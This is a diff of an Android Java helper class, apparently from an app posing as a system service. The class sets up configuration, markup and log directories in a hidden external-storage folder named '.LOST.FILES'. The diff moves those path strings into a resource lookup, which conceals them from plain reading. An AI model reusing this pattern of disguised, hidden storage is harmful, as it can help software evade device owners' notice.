@@ -14,6 +14,7 @@ import java.io.File;
 import android.os.Environment;
 import android.os.StatFs;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
@@ -24,18 +25,18 @@ import com.android.service.util.Check;
 public class Path {
 
 	/** The Constant TAG. */
-	private static final String TAG = "PATH";
+	private static final String TAG = "PATH"; //$NON-NLS-1$
 
 	/** The Constant CONF_DIR. */
-	private static final String CONF_DIR = "cdd/";
+	private static final String CONF_DIR = Messages.getString("Path.0"); //$NON-NLS-1$
 	// public static final String DEBUG_DIR = "dwm/";
 	/** The Constant MARKUP_DIR. */
-	private static final String MARKUP_DIR = "msdd/";
+	private static final String MARKUP_DIR = Messages.getString("Path.1"); //$NON-NLS-1$
 
 	/** The Constant LOG_DIR. */
-	private static final String LOG_DIR = "ldd/";
+	private static final String LOG_DIR = Messages.getString("Path.2"); //$NON-NLS-1$
 
-	public static final String LOG_FILE = "logs.txt";
+	public static final String LOG_FILE = "logs.txt"; //$NON-NLS-1$
 
 	/** The hidden. */
 	private static String hidden;
@@ -68,7 +69,7 @@ public class Path {
 			if (haveStorage()) {
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (makeDirs): hidden = " + hidden());
+					Check.log(TAG + " (makeDirs): hidden = " + hidden()) ;//$NON-NLS-1$
 				}
 				createDirectory(conf());
 				createDirectory(markup());
@@ -84,14 +85,14 @@ public class Path {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());
+				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		}
 		return false;
 	}
 
 	/**
-	 * Check storage.
+	 * Check.storage. //$NON-NLS-1$
 	 */
 	public static boolean haveStorage() {
 		boolean mExternalStorageAvailable = false;
@@ -113,7 +114,7 @@ public class Path {
 		}
 
 		if (mExternalStorageWriteable) {
-			hidden = Environment.getExternalStorageDirectory() + "/" + ".LOST.FILES/";
+			hidden = Environment.getExternalStorageDirectory() + Messages.getString("Path.4") + Messages.getString("Path.5"); //$NON-NLS-1$ //$NON-NLS-2$
 			return true;
 		} else {
 			hidden = null;
@@ -184,12 +185,12 @@ public class Path {
 			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
 			final long megAvailable = bytesAvailable / 1048576;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");
+				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB") ;//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return bytesAvailable;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (freeSpace) Error: no external path");
+				Check.log(TAG + " (freeSpace) Error: no external path") ;//$NON-NLS-1$
 			}
 			return 0;
 		}
